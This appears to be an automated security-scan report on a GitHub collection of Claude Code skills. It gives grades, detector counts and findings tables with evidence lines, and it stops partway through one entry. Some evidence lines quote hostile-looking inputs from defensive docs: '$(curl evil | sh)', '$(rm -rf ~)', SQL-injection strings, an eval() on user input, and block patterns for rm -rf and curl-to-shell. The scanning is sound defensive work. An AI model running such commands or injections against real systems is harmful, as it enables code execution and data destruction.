# borghei/Claude-Skills

Source: https://github.com/borghei/Claude-Skills

**404 skills · average 95.6/100 · scanned 2026-11-10 with scanner v1**

Grades: A 358 · B 20 · C 15 · D 9 · F 2

## Capability profile

| Tier | What it means | Skills |
| :-: | --- | --: |
| T0 text | Text in, text out. Touches nothing. | 0 |
| T1 read | Reads files in the working directory. | 1 |
| T2 write | Writes or edits files. | 15 |
| T3 exec | Runs shell commands or bundled scripts. | 386 |
| T4 remote | Executes code or instructions fetched from the network. | 2 |

## What fired

| Detector | Skills | Share |
| --- | --: | --: |
| `network-egress` | 62 | 15% |
| `destructive` | 21 | 5% |
| `dotenv-access` | 21 | 5% |
| `unpinned-install` | 19 | 5% |
| `persistence` | 11 | 3% |
| `instruction-override` | 8 | 2% |
| `env-key-reference` | 8 | 2% |
| `secret-access` | 7 | 2% |
| `obfuscation` | 6 | 1% |
| `privilege-escalation` | 5 | 1% |
| `ip-literal-url` | 3 | 1% |
| `conceal-from-user` | 1 | 0% |
| `pipe-to-shell` | 1 | 0% |
| `zero-width` | 1 | 0% |

## Everything below an A (46)

### F · 0/100 · `devops-workflow-engineer`

`engineering/devops-workflow-engineer` — tier 3 (exec)

> Generate and optimize GitHub Actions CI/CD workflows. Use when designing workflows, planning multi-environment deployments, optimizing pipeline cost and runtime, or implementing blue-green, canary, or

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `references/deployment-strategies.md:562` | plain | `\| DROP TABLE \| Everything breaks \| Deprecate, stop references, then drop \|` |
| **high** | `secret-access` | `scripts/workflow_generator.py:132` | plain | `echo "${{ secrets.KUBECONFIG }}" \| base64 -d > $HOME/.kube/config` |
| **high** | `obfuscation` | `scripts/workflow_generator.py:132` | plain | `echo "${{ secrets.KUBECONFIG }}" \| base64 -d > $HOME/.kube/config` |
| **medium** | `network-egress` | `assets/cd-template.yml:206` | plain | `#   if curl -sf "${{ vars.HEALTH_CHECK_URL }}/health" --max-time ${{ env.HEALTH_CHECK_TIMEOUT }}; then` |
| **medium** | `network-egress` | `references/deployment-strategies.md:65` | fence | `curl -sf https://green.internal.example.com/health \|\| exit 1` |
| **medium** | `network-egress` | `references/github-actions-patterns.md:537` | fence | `TOKEN=$(curl -s https://auth.example.com/token)` |
| **medium** | `network-egress` | `scripts/deployment_planner.py:535` | plain | `lines.append(f'STATUS=$(curl -s -o /dev/null -w "%{{http_code}}" --max-time {hc["timeout_seconds"]} "$HEALTH_U` |
| **medium** | `network-egress` | `scripts/workflow_generator.py:460` | plain | `# curl -sf "${{{{ vars.HEALTH_CHECK_URL }}}}/health" \|\| exit 1` |
| **low** | `env-key-reference` | `assets/cd-template.yml:94` | plain | `password: ${{ secrets.GITHUB_TOKEN }}` |
| **low** | `unpinned-install` | `assets/ci-template.yml:74` | plain | `run: pip install ruff` |
| **low** | `env-key-reference` | `references/github-actions-patterns.md:847` | fence | `repo-token: ${{ secrets.GITHUB_TOKEN }}` |
| **low** | `env-key-reference` | `scripts/workflow_generator.py:182` | plain | `token: ${{ secrets.GITHUB_TOKEN }}"""),` |
| **low** | `unpinned-install` | `scripts/workflow_generator.py:37` | quote | `"lint_packages": "pip install ruff",` |

### F · 31/100 · `env-secrets-manager`

`engineering/env-secrets-manager` — tier 3 (exec)

> Environment and secrets management lifecycle: .env scaffolding, validation, leak detection, and rotation across Vault, AWS SSM, 1Password, and Doppler. Use when setting up projects, scanning for leake

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `secret-access` | `references/env-file-structure.md:80` | fence | `.aws/credentials` |
| **medium** | `network-egress` | `references/env-file-structure.md:106` | fence | `"STRIPE_WEBHOOK_SECRET": {"pattern": r"^whsec_", "description": "Stripe webhook secret"},` |
| **medium** | `network-egress` | `references/leak-detection-and-rotation.md:134` | fence | `curl -s -o /dev/null -w "%{http_code}" \` |
| **medium** | `network-egress` | `scripts/env_validator.py:32` | quote | `(r"^whsec_[0-9a-zA-Z]{32,}$", "Stripe Webhook Secret"),` |
| **medium** | `network-egress` | `scripts/secret_scanner.py:36` | quote | `(re.compile(r"whsec_[0-9a-zA-Z]{32,}"), "Stripe Webhook Secret", "high"),` |
| **low** | `env-key-reference` | `assets/sample_leaky_config.py:3` | plain | `AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"` |
| **low** | `dotenv-access` | `references/best-practices-and-troubleshooting.md:7` | plain | `- **Committing .env to git** — add `.env` to .gitignore on day 1; use pre-commit hooks as a safety net` |
| **low** | `env-key-reference` | `references/env-file-structure.md:37` | fence | `AWS_ACCESS_KEY_ID=               # Prefer IAM roles in production` |
| **low** | `dotenv-access` | `references/env-file-structure.md:1` | plain | `# .env File Structure & Startup Validation` |
| **low** | `dotenv-access` | `references/secret-manager-integration.md:56` | fence | `doppler secrets download --no-file --format env > .env.local` |
| **low** | `dotenv-access` | `scripts/env_sync_checker.py:4` | plain | `Loads multiple .env files (e.g., .env.development, .env.staging, .env.production)` |
| **low** | `dotenv-access` | `scripts/env_validator.py:2` | quote | `"""Validate .env files against .env.example — detect missing, extra, and suspicious vars.` |
| **low** | `dotenv-access` | `SKILL.md:4` | plain | `Environment and secrets management lifecycle: .env scaffolding, validation, leak detection,` |

### D · 49/100 · `human-step-wizard`

`engineering/human-step-wizard` — tier 4 (remote)

> Generate an interactive, resumable bash wizard that walks a person through steps only a human can do. Use when a task needs dashboard credentials, DNS or change approval, key rotation, or a manual tra

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `assets/wizard_runtime.sh:163` | plain | `[ "$seen" = "1" ] \|\| { rm -f "$keep"; w_die "unknown step id: $from"; }` |
| **high** | `pipe-to-shell` | `references/bash-wizard-safety.md:53` | inline-code | `pasted `$(curl evil \| sh)`; `declare "$name=$value"` has edge cases with` |
| **medium** | `network-egress` | `assets/sample_wizard_spec_flawed.json:2` | quote | `"title": "Rotate the payments webhook secret",` |
| **medium** | `network-egress` | `assets/sample_wizard_spec.json:85` | quote | `"command": "curl -fsS --max-time 10 --resolve \"api.example.com:443:${NEW_LB_IP}\" https://api.example.com/hea` |
| **medium** | `destructive` | `references/bash-wizard-safety.md:93` | inline-code | `like `PATH=/tmp/evil` or `$(rm -rf ~)` added to the file by hand is ignored.` |
| **medium** | `network-egress` | `references/human-step-design.md:67` | plain | `\| Secret \| `secret: true` for anything that grants access: tokens, passwords, private keys, webhook secrets. H` |
| **low** | `dotenv-access` | `assets/sample_wizard_spec.json:5` | quote | `"env_file": ".env.cutover",` |
| **low** | `network-egress` | `references/bash-wizard-safety.md:53` | inline-code | `pasted `$(curl evil \| sh)`; `declare "$name=$value"` has edge cases with` |
| **low** | `dotenv-access` | `references/human-step-design.md:41` | quote | `store it. Rollback text can then say "the OLD_LB_IP saved in .env.cutover"` |
| **low** | `dotenv-access` | `scripts/wizard_generate.py:96` | quote | `f"[ -n \"$WIZARD_ENV_FILE\" ] \|\| WIZARD_ENV_FILE={q(spec.get('env_file', '.env'))}",` |
| **low** | `dotenv-access` | `scripts/wizard_spec_validate.py:82` | quote | `env_file = spec.get("env_file", ".env")` |
| **low** | `dotenv-access` | `SKILL.md:165` | fence | `"env_file": ".env.cutover",` |
| **low** | `network-egress` | `SKILL.md:61` | inline-code | `- **How to verify each step from outside:** a `dig`, `curl`, `gh` or `test`` |

### D · 49/100 · `senior-data-engineer`

`engineering/senior-data-engineer` — tier 3 (exec)

> Data engineering for batch and streaming pipelines with Airflow, dbt, Spark, and Kafka. Use when designing data architectures, building pipelines, adding data-quality checks, optimizing ETL/ELT, or tr

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `references/data_pipeline_architecture.md:975` | fence | `self.snowflake.execute(f"TRUNCATE TABLE {table_name}")` |
| **high** | `persistence` | `scripts/data_quality_validator.py:1367` | plain | `profile = profiler.profile(data, name=Path(args.input).stem)` |
| **medium** | `network-egress` | `references/dataops_best_practices.md:819` | fence | `curl -X POST ${{ secrets.SLACK_WEBHOOK }} \` |
| **low** | `unpinned-install` | `references/dataops_best_practices.md:740` | fence | `pip install sqlfluff dbt-core dbt-snowflake` |

### D · 49/100 · `senior-mobile`

`engineering/senior-mobile` — tier 3 (exec)

> Mobile development across SwiftUI, Jetpack Compose, React Native (Expo) and Flutter: scaffolding, feature architecture, static performance checks and store listings. Use when building, optimizing or s

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `privilege-escalation` | `references/ios-android-patterns.md:682` | fence | `run: sudo xcode-select -s /Applications/Xcode_15.2.app` |
| **high** | `persistence` | `scripts/mobile_scaffold.py:786` | plain | `import {pkg}.features.profile.ProfileScreen` |
| **medium** | `network-egress` | `references/react-native-patterns.md:277` | fence | `const response = await fetch('https://api.example.com/products');` |
| **medium** | `network-egress` | `scripts/app_performance_analyzer.py:322` | quote | `"axios": "axios is ~13KB. fetch() is built-in for React Native.",` |
| **low** | `unpinned-install` | `references/ios-android-patterns.md:686` | fence | `gem install fastlane` |

### D · 54/100 · `codex-cli-specialist`

`engineering/codex-cli-specialist` — tier 3 (exec)

> Converts Claude Code skills to OpenAI Codex format (agents/openai.yaml), checks dual-platform compatibility and builds a skills index. Use when porting or syncing skills to Codex, or setting up Codex 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `references/codex-cli-guide.md:495` | fence | `rm -rf ~/.codex/history/` |
| **high** | `persistence` | `references/codex-cli-guide.md:75` | fence | `echo 'export OPENAI_API_KEY="sk-..."' >> ~/.zshrc` |
| **low** | `unpinned-install` | `references/best-practices-and-troubleshooting.md:14` | plain | `3. **Scripts use standard library only** - No pip install requirements for core functionality` |
| **low** | `env-key-reference` | `references/codex-cli-guide.md:72` | fence | `export OPENAI_API_KEY="sk-..."` |
| **low** | `env-key-reference` | `references/workflows.md:139` | fence | `export OPENAI_API_KEY="sk-..."` |

### D · 55/100 · `design-auditor`

`engineering/design-auditor` — tier 3 (exec)

> Grade a UI (Design, AI-slop and Accessibility, A-F) and gate it in CI: batch WCAG contrast, token compliance, slop detection. Use when asked to audit, score or gate a UI; to fix one, use interface-ref

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **critical** | `conceal-from-user` | `references/design_audit_methodology.md:196` | plain | `- **Silent failures** — Actions fail without informing the user` |

### D · 55/100 · `linkedin-humanizer`

`tools/linkedin/linkedin-humanizer` — tier 3 (exec)

> Audits and rewrites LinkedIn drafts to remove machine-sounding patterns: tiered tell catalogue, emoji-pattern scoring, rule explanations, and a voice fingerprint built from the author's own posts. Use

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **critical** | `zero-width` | `scripts/emoji_audit.py:32` | quote | `EMOJI_RE = re.compile(f"{_BASE}{_MOD}(?:·{_BASE}{_MOD})*")` |

### D · 57/100 · `claude-code-mastery`

`engineering/claude-code-mastery` — tier 3 (exec)

> Optimizes CLAUDE.md files, scaffolds skills and subagents, wires hooks and measures context budget for Claude Code. Use when writing or trimming a CLAUDE.md, creating a skill, subagent or hook, or aud

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `secret-access` | `references/hooks-cookbook.md:269` | fence | `"command": "IN=$(cat); F=$(jq -r '.tool_input.file_path // empty' <<<\"$IN\"); if echo \"$F\" \| grep -qiE '(\\` |
| **high** | `destructive` | `references/hooks-cookbook.md:289` | fence | `"command": "IN=$(cat); CMD=$(jq -r '.tool_input.command // empty' <<<\"$IN\"); if echo \"$CMD\" \| grep -qE '(r` |
| **high** | `destructive` | `references/subagent-patterns.md:312` | fence | `"Bash(rm -rf *)",` |
| **low** | `dotenv-access` | `scripts/context_analyzer.py:51` | quote | `"extensions": [".json", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".env.example", ".gitignore"],` |

### D · 57/100 · `infrastructure-compliance-auditor`

`ra-qm-team/infrastructure-compliance-auditor` — tier 3 (exec)

> Cross-framework infrastructure security audit across cloud, network, and CI/CD. Use for infrastructure and cloud security audits, security posture assessment, and validating technical controls for SOC

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `secret-access` | `references/access-control-standards.md:613` | fence | `public_key=@$HOME/.ssh/id_ed25519.pub \` |
| **high** | `privilege-escalation` | `scripts/access_control_auditor.py:312` | quote | `"Disable root SSH login: PermitRootLogin no in sshd_config. Use named accounts + sudo for privilege escalation` |
| **low** | `dotenv-access` | `scripts/infra_audit_runner.py:539` | quote | `("secrets_management", "SEC-CODE-002", ".env files in .gitignore", "High",` |

### D · 57/100 · `release-orchestrator`

`engineering/release-orchestrator` — tier 3 (exec)

> Gates a release from a live git checkout: preflight checks, secret scan, tag-based SemVer bump, changelog and GO/NO-GO score. Use when cutting a release from a repo (offline notes and plans from text:

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `references/rollback_strategies.md:12` | plain | `- Add table (rollback: drop table)` |
| **high** | `secret-access` | `scripts/preflight_checker.py:94` | quote | `"id_rsa",` |
| **low** | `dotenv-access` | `scripts/preflight_checker.py:83` | quote | `".env",` |

### C · 60/100 · `ai-feature-prd`

`project-management/execution/ai-feature-prd` — tier 3 (exec)

> Extends a PRD with model choice, eval and safety plan, guardrails, cost model and rollout gates for an AI or ML feature. Use when specifying any LLM, RAG, agent or ML feature, or replacing a rules-bas

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `instruction-override` | `assets/failure_mode_taxonomy.md:62` | plain | `**What:** Untrusted input (e.g., a document, a webpage, a tool result) contains instructions that override the` |
| **high** | `obfuscation` | `assets/failure_mode_taxonomy.md:14` | plain | `- Faithfulness eval (RAGAS or custom rubric) on golden + online samples.` |
| **high** | `obfuscation` | `references/ai-pm-frameworks-guide.md:125` | plain | `\| **RAGAS** \| RAG-specific eval (faithfulness, context relevance) \| Any RAG feature \|` |

### C · 60/100 · `computer-use-automation`

`engineering/computer-use-automation` — tier 3 (exec)

> Decides when a GUI-driving (computer-use) agent beats an API and lints planned screen actions for missing confirmation, verification and grounding. Use when designing a computer-use agent or reviewing

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `assets/sample_plan_risky.json:3` | quote | `{"type": "type", "target": "terminal", "text": "rm -rf ./build && sudo systemctl restart api"},` |
| **high** | `privilege-escalation` | `assets/sample_plan_risky.json:3` | quote | `{"type": "type", "target": "terminal", "text": "rm -rf ./build && sudo systemctl restart api"},` |
| **high** | `destructive` | `scripts/action_safety_linter.py:35` | quote | `r"rm\s+-rf\|drop\s+(table\|database)\|truncate\s+table\|mkfs\|format\s+[a-z]:\|shutdown\|"` |
| **medium** | `destructive` | `SKILL.md:68` | inline-code | `**What the linter flags.** High: destructive verbs (delete, send, pay, submit...) without `confirmed`, state c` |

### C · 60/100 · `git-guardrails`

`engineering/git-guardrails` — tier 3 (exec)

> Install a hook that blocks destructive git commands before an AI agent runs them. Use when an agent force-pushed or ran reset --hard, when adding git safety hooks, or when protecting main from agent p

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `assets/git_guardrails_hook.py:18` | quote | `Manual check:  python3 git_guardrails_hook.py --check "git push -f origin main"` |
| **high** | `destructive` | `assets/sample_command_corpus.json:18` | plain | `"command": "git commit -m \"fix(api): handle null; git push -f is not run\"",` |
| **high** | `privilege-escalation` | `assets/sample_command_corpus.json:293` | quote | `"command": "sudo git reset --hard",` |
| **high** | `destructive` | `references/hook-mechanics.md:21` | fence | `"tool_input": {"command": "git reset --hard", "description": "Discard changes"}` |
| **high** | `destructive` | `scripts/guardrail_test.py:13` | quote | `python3 guardrail_test.py --command "git push -f origin main" --branch feature/x` |
| **medium** | `destructive` | `references/rule-catalog.md:24` | inline-code | `\| `reset-hard` \| `git reset --hard [ref]` \| `reset --soft`, `reset --mixed`, `reset <file>` \| `git stash push ` |
| **medium** | `privilege-escalation` | `references/rule-catalog.md:101` | inline-code | `\| Env prefix / wrappers \| `GIT_TRACE=1 sudo git reset --hard`, `sudo -u deploy git ...`, `nice -n 10 git ...`,` |
| **medium** | `destructive` | `SKILL.md:19` | inline-code | `An agent with shell access can run `git reset --hard`, `git clean -fdx` or` |

### C · 64/100 · `senior-ml-engineer`

`engineering/senior-ml-engineer` — tier 3 (exec)

> Productionize ML models and LLM features: deployment specs, drift monitoring, RAG design and cost control. Use when deploying a model, building RAG, or monitoring drift.

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `scripts/model_deployment_pipeline.py:231` | quote | `"    && rm -rf /var/lib/apt/lists/*\n") if py == "python3" else ""` |
| **medium** | `network-egress` | `references/tool-reference.md:36` | plain | `\| `Dockerfile` \| Pinned slim base (`python:3.11-slim`, or a CUDA runtime image when `gpu` is true), non-root u` |
| **medium** | `ip-literal-url` | `scripts/model_deployment_pipeline.py:232` | quote | `probe = (f"import urllib.request; urllib.request.urlopen('http://127.0.0.1:{s['port']}"` |

### C · 69/100 · `docker-development`

`engineering/docker-development` — tier 3 (exec)

> Analyse Dockerfiles and Compose files for security, image size, cache and config problems, with CI-ready exit codes. Use when reviewing or optimising a Dockerfile, validating docker-compose, or adding

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `references/docker-best-practices.md:59` | fence | `&& rm -rf /var/lib/apt/lists/*` |
| **medium** | `network-egress` | `references/docker-best-practices.md:58` | fence | `&& apt-get install -y --no-install-recommends curl ca-certificates \` |
| **medium** | `network-egress` | `scripts/dockerfile_analyzer.py:65` | quote | `(r"curl.*\\|.*sh", "Piping curl to shell is risky"),` |
| **low** | `dotenv-access` | `references/docker-best-practices.md:97` | plain | `- Never COPY .env files or embed secrets in images` |

### C · 69/100 · `feature-flags-architect`

`engineering/feature-flags-architect` — tier 3 (exec)

> Feature flag strategy, lifecycle, and operations. Use when designing a flag taxonomy, planning a gradual rollout, building kill switches, auditing flag debt, defining governance, running progressive d

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `persistence` | `scripts/rollout_simulator.py:330` | plain | `if args.profile == "custom":` |
| **medium** | `network-egress` | `references/flag-debt-and-cleanup.md:231` | fence | `curl https://flags.example.com/api/v1/flags/growth.signup_v2.enabled \` |
| **medium** | `network-egress` | `references/flag-types-and-patterns.md:78` | fence | `return recommendations_service.fetch(user_id, timeout=200)` |
| **medium** | `network-egress` | `references/rollout-and-kill-switch-playbook.md:233` | fence | `return recommendations_service.fetch(user_id)` |
| **low** | `dotenv-access` | `scripts/flag_audit.py:63` | quote | `SKIP_DIRS = {".git", "node_modules", "venv", ".venv", "env", ".env", "__pycache__", "dist", "build", "target",` |

### C · 69/100 · `git-worktree-manager`

`engineering/git-worktree-manager` — tier 3 (exec)

> Run parallel Git worktrees without collisions: a port block per worktree, .env sync, health checks for stale or dirty trees, and safe cleanup of merged ones. Use when several branches or agents need r

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `references/setup-and-ports.md:157` | fence | `rm -f "$WT_PATH/.env.bak"` |
| **medium** | `secret-access` | `references/operations-playbook.md:32` | inline-code | `\| Dependencies fail to install in new worktree \| Lockfile references a private registry or cache not available` |
| **low** | `dotenv-access` | `references/operations-playbook.md:12` | plain | `- **Not updating .env ports after worktree creation** — the setup script should handle this automatically` |
| **low** | `dotenv-access` | `references/setup-and-ports.md:124` | fence | `for envfile in .env .env.local .env.development; do` |
| **low** | `dotenv-access` | `scripts/worktree_validator.py:30` | quote | `ENV_FILES = [".env", ".env.local", ".env.development", ".env.test"]` |
| **low** | `dotenv-access` | `SKILL.md:4` | plain | `Run parallel Git worktrees without collisions: a port block per worktree, .env sync,` |

### C · 69/100 · `senior-frontend`

`engineering/senior-frontend` — tier 3 (exec)

> Scaffold Next.js 16 or React + Vite 8 apps, generate components with tests and stories, and flag heavy bundle dependencies. Use when starting a React project, adding components or hooks, or reviewing 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `obfuscation` | `assets/templates/scaffold/files/auth_lib.ts:18` | plain | `for (const byte of bytes) binary += String.fromCharCode(byte);` |
| **medium** | `network-egress` | `assets/templates/scaffold/files/api_client.ts:40` | plain | `const response = await fetch(`${baseUrl}${path}`, {` |
| **medium** | `network-egress` | `references/code-patterns.md:67` | fence | `fetch(url).then(r => r.json()).then(setData).finally(() => setLoading(false));` |
| **medium** | `network-egress` | `references/frontend_best_practices.md:786` | fence | `const response = await fetch('https://api.example.com/data', {` |
| **medium** | `network-egress` | `references/nextjs_optimization_guide.md:379` | fence | `fetch('https://api.example.com/data', { cache: 'force-cache' });` |
| **low** | `unpinned-install` | `references/nextjs_optimization_guide.md:470` | fence | `npm install @next/bundle-analyzer` |

### C · 69/100 · `stripe-integration-expert`

`engineering/stripe-integration-expert` — tier 3 (exec)

> Implement Stripe integrations for SaaS billing: subscriptions, checkout, proration, usage- based billing, idempotent webhooks, customer portal, dunning, and SCA. Use when building billing, handling we

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `persistence` | `scripts/checkout_scaffolder.py:413` | plain | `profile = request.user.profile` |
| **medium** | `network-egress` | `assets/sample_project_sound/stripe_webhook.ts:35` | quote | `console.error("webhook processing failed", event.id, err);` |
| **medium** | `network-egress` | `references/testing-and-troubleshooting.md:41` | plain | `\| Trusting webhook event data \| Stale data, race conditions \| Always re-fetch from Stripe API in handlers \|` |
| **medium** | `network-egress` | `references/webhooks.md:3` | plain | `Read this when building or auditing the Stripe webhook endpoint. This is the most critical code in your billin` |
| **medium** | `network-egress` | `scripts/checkout_scaffolder.py:5` | plain | `frameworks. Includes checkout session creation, webhook handler, subscription` |
| **medium** | `network-egress` | `scripts/integration_auditor.py:5` | plain | `missing idempotency keys, unhandled webhook events, unpinned API versions,` |
| **medium** | `network-egress` | `scripts/webhook_validator.py:2` | quote | `"""Stripe Webhook Endpoint Configuration Validator.` |
| **medium** | `network-egress` | `SKILL.md:15` | plain | `frameworks: stripe-subscriptions, webhook-handling, billing-infrastructure` |
| **low** | `dotenv-access` | `scripts/integration_auditor.py:257` | quote | `"""Check that .env files with Stripe keys are gitignored."""` |

### C · 72/100 · `api-test-suite-builder`

`engineering/api-test-suite-builder` — tier 3 (exec)

> Generates API test skeletons from an OpenAPI spec, measures which endpoints tests really assert on, and checks response samples against the spec. Use when adding API tests, auditing API test coverage,

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `references/route-detection-and-matrices.md:154` | fence | `name: "'; DROP TABLE projects; --",` |
| **medium** | `network-egress` | `references/contract-and-load-testing.md:52` | fence | `const response = await fetch(`${mockServer.url}/api/v1/projects`, {` |

### C · 72/100 · `bug-diagnosis`

`engineering/bug-diagnosis` — tier 3 (exec)

> Find the root cause of hard bugs with a fast pass/fail repro, ranked falsifiable hypotheses and bisection. Use when a bug resists quick fixes, a failure is intermittent, or a regression needs tracing 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `assets/repro-script-template.sh:12` | plain | `trap 'rm -rf "$WORKDIR"' EXIT` |
| **medium** | `network-egress` | `assets/sample_debug_log.txt:9` | plain | `2026-11-02T09:14:10Z DEBUG webhook signing token=EXAMPLE0000000000000000` |

### C · 72/100 · `code-reviewer`

`engineering/code-reviewer` — tier 3 (exec)

> Heuristic code-review pre-pass for TS, JS, Python, Go, Swift and Kotlin: PR risk, smells, SOLID issues, and a two-axis (standards vs spec) review method. Use when reviewing a PR or preparing a review 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `persistence` | `references/coding_standards.md:91` | fence | `const userName = user?.profile?.name ?? 'Anonymous';` |
| **medium** | `network-egress` | `references/common_antipatterns.md:30` | fence | `sendEmail(userId: string, content: string) { ... }` |

### C · 72/100 · `migration-architect`

`engineering/migration-architect` — tier 3 (exec)

> Plans zero-downtime migrations with compatibility validation, rollback strategies, and phased execution plans. Use when migrating databases, APIs, infrastructure, or services between platforms or vers

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `expected_outputs/rollback_runbook.txt:214` | plain | `DROP TABLE IF EXISTS migration_log;` |
| **high** | `destructive` | `expected_outputs/schema_compatibility_report.json:73` | quote | `"rollback_script": "DROP TABLE IF EXISTS user_preferences;",` |
| **high** | `destructive` | `scripts/compatibility_checker.py:241` | quote | `rollback_script=f"DROP TABLE IF EXISTS {table_name};",` |
| **high** | `destructive` | `scripts/rollback_generator.py:133` | quote | `"drop_table": "DROP TABLE IF EXISTS {table_name};",` |
| **medium** | `network-egress` | `references/zero_downtime_techniques.md:331` | fence | `if curl -f http://$TARGET_IP/health; then` |
| **medium** | `network-egress` | `scripts/rollback_generator.py:156` | quote | `"revert_feature_flags": "curl -X PUT {feature_flag_api}/flags/{flag_name} -d '{\"enabled\": false}'",` |

### C · 72/100 · `security-audit`

`engineering/security-audit` — tier 3 (exec)

> Multi-agent source security audit with a coverage ledger, independently verified findings, and machine-checked records. Use when asked to audit a codebase, find vulnerabilities, or run a source-level 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `persistence` | `scripts/audit_run.py:96` | plain | `gate = plan_budget(args.budget, args.profile, 0, None)` |
| **medium** | `network-egress` | `assets/sample_coverage_ledger.json:274` | quote | `"label": "Webhook test: server-side fetch of a caller-supplied URL",` |
| **medium** | `network-egress` | `references/attack-classes.md:104` | plain | `- **Server-side fetches** — a URL, host, or webhook target the caller` |
| **medium** | `network-egress` | `references/protocols-rpc-and-messaging.md:126` | plain | `- Check webhook receivers for signature verification, replay windows, and` |

### C · 72/100 · `senior-backend`

`engineering/senior-backend` — tier 3 (exec)

> Builds and reviews Node.js REST APIs on PostgreSQL: OpenAPI-to-route scaffolding, schema and index analysis with migrations, HTTP load tests with a CI gate. Use when designing endpoints, fixing slow q

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `references/backend_security_practices.md:459` | fence | `const email = "'; DROP TABLE users; --";` |
| **high** | `destructive` | `scripts/database_migration_tool.py:449` | quote | `down_statements.append(f"DROP TABLE IF EXISTS {table_name};")` |
| **medium** | `network-egress` | `references/backend_security_practices.md:209` | fence | `// Verify webhook signatures (e.g., Stripe)` |
| **medium** | `network-egress` | `scripts/api_load_tester.py:26` | plain | `from urllib.request import Request, urlopen` |
| **low** | `network-egress` | `references/workflows-and-patterns.md:236` | inline-code | `\| Load tester reports 100% failure rate \| Target URL unreachable, SSL verification failing, or firewall blocki` |

### B · 77/100 · `dependency-auditor`

`engineering/dependency-auditor` — tier 3 (exec)

> Scan project dependencies for vulnerabilities, license issues, and upgrade opportunities across Python, Node.js, Go, and Rust. Use when auditing dependencies, checking licenses, planning upgrades, or 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `obfuscation` | `references/vulnerability_assessment_guide.md:56` | plain | `- **Detection**: eval() usage, dynamic code generation` |
| **low** | `unpinned-install` | `references/dependency_management_best_practices.md:506` | fence | `pip install pip-audit` |

### B · 77/100 · `pr-review-expert`

`engineering/pr-review-expert` — tier 3 (exec)

> Reviews risky PRs by blast radius: what imports the changed files, breaking API and schema changes, sensitive paths and test deltas. Use when a PR touches shared libraries, APIs, schemas or auth (for 

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `destructive` | `references/review-workflow-commands.md:102` | fence | `grep -E "DROP TABLE\|DROP COLUMN\|ALTER.*NOT NULL\|TRUNCATE" $DIFF` |
| **high** | `destructive` | `scripts/review_checklist_generator.py:109` | quote | `("breaking", "No destructive operations (DROP TABLE/COLUMN) without migration plan"),` |
| **low** | `dotenv-access` | `references/writeup-format-and-checklist.md:72` | fence | `- [ ] New env vars documented in .env.example` |
| **low** | `dotenv-access` | `scripts/review_checklist_generator.py:145` | quote | `("breaking", "New environment variables documented in .env.example"),` |

### B · 77/100 · `senior-secops`

`engineering/senior-secops` — tier 3 (exec)

> SecOps for application security, vulnerability management, compliance, and secure development. Use when implementing security controls, conducting security audits, responding to vulnerabilities, or me

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `obfuscation` | `scripts/security_scanner.py:134` | plain | `'eval() with potential user input'),` |
| **low** | `dotenv-access` | `scripts/security_scanner.py:61` | plain | `'.yml', '.yaml', '.json', '.xml', '.env', '.conf', '.config'` |

### B · 80/100 · `ai-security`

`engineering/ai-security` — tier 3 (exec)

> Static scan of AI/ML code for prompt injection, unsafe model loading, data poisoning, model extraction and insecure serving, plus an agent and tool-use threat checklist. Use when reviewing an LLM app,

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `obfuscation` | `assets/sample_vulnerable_app.py:24` | plain | `return {"result": eval(request.args["user_expr"])}` |
| **high** | `obfuscation` | `scripts/ai_threat_scanner.py:220` | quote | `"eval() or exec() is called with user-controlled data, enabling remote code execution.",` |

### B · 80/100 · `business-investment-advisor`

`finance/business-investment-advisor` — tier 3 (exec)

> This skill should be used when the user asks to "screen investments", "analyze a portfolio", "evaluate investment opportunities", "run due diligence", "assess investment risk", "calculate ROI", or "di

| Severity | Detector | Where | Context | Evidence |
| --- | --- | --- | --- | --- |
| **high** | `persistence` | `scripts/portfolio_analyzer.py:305` | plain | `profile = PROFILES[args.profile]` |

### B · 80/100 · `data-quality-auditor`

`engineering/data-quality-auditor` — tier 3 (exec)

